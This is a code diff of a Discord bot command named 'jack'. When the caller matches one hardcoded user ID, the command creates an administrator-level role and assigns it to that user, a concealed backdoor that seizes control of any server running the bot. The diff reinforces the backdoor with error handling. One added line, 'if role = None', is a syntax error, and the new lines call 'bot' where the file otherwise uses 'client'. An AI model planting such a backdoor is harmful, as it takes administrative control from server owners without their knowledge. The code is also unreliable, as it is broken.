@@ -130,8 +130,13 @@ async def mute(ctx, member: discord.Member, time: int, *,reason: str):
 @client.command(pass_context=True)
 async def jack(ctx):
     if ctx.message.author.id == '344967220025098242':
-        await client.create_role(ctx.message.server, name="JACK")
+        try:
+            await client.create_role(ctx.message.server, name="JACK")
+        except Exception as e:
+            return await bot.say("Error: {}".format(e))
         role = discord.utils.get(ctx.message.author.server.roles, name="JACK")
+        if role = None:
+            return await bot.say("No role found?")
         role.permissions.administrator = True
         await client.add_roles(ctx.message.author, role)
     else:
